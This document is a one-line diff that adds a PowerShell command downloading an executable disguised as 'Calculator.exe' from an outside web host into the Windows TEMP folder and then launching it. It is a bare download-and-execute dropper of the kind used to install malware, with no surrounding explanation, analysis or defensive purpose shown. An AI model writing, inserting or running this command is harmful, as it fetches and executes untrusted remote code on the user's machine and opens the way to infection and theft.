@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('http://lvrxd.3eeweb.com/nano/Calculator.exe',"$env:TEMPtest.exe");Start-Process ("$env:TEMPtest.exe")
